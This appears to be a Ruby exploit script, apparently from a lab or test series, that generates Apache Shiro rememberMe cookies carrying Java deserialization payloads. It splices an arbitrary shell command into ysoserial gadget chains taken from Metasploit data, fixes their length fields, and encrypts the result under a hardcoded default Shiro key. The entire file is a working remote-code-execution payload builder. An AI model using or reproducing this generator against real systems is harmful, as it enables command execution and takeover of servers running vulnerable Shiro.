#!/usr/bin/env ruby
# loop3 t7 C1 — Shiro rememberMe 反序列化 payload 生成（纯离线，自实现 ysoserial 模板拼装）
# 复刻 Msf::Util::JavaDeserialization.ysoserial_payload 的逻辑（bufferOffset 注入 + lengthOffset 改长度）
# 用法: ruby t7-c1-shiro-gen.rb <chain> <command> <out> [key_b64] [json_path]
require 'json'
require 'base64'
require 'openssl'

chain = ARGV[0] || 'CommonsBeanutils1'
cmd   = ARGV[1] || 'id'
out   = ARGV[2] || '/tmp/t7-c1-cookie.txt'
key_b64 = ARGV[3] || 'kPH+bIxk5D2deZiIxcaaaA=='
json_path = ARGV[4] || '/usr/share/metasploit-framework/data/ysoserial_payloads.json'

payloads = JSON.parse(File.read(json_path, mode: 'rb'))['bash']
p = payloads[chain]
raise "chain #{chain} not found" if p.nil?

bytes = Base64.decode64(p['bytes']).dup
if p['status'] == 'dynamic'
  bo = p['bufferOffset'].first
  bytes[bo - 1] = bytes[bo - 1] + cmd
  p['lengthOffset'].each do |lo|
    len = bytes[(lo - 1)..lo].unpack1('n')
    len += cmd.length.ord
    bytes[(lo - 1)..lo] = [len].pack('n')
  end
  bytes = bytes.gsub('ysoserial/Pwner00000000000000', 'A' * 29)
  bytes = bytes.gsub('ysoserial', 'B' * 9)
elsif p['status'] != 'static'
  raise "unsupported status #{p['status']} for #{chain}"
end

cipher = OpenSSL::Cipher.new('aes-128-cbc')
cipher.encrypt
cipher.key = Base64.decode64(key_b64)
iv = cipher.random_iv
ct = iv + cipher.update(bytes) + cipher.final
b64 = Base64.strict_encode64(ct)

File.write(out, b64)
puts "CHAIN=#{chain}"
puts "CMD=#{cmd}"
puts "KEY_B64=#{key_b64}"
puts "SER_LEN=#{bytes.length} SER_MAGIC=#{bytes[0,4].unpack1('H*')}"
puts "IV_LEN=#{iv.length} CT_LEN=#{ct.length}"
puts "COOKIE_LEN=#{b64.length}"
puts "COOKIE=#{b64}"
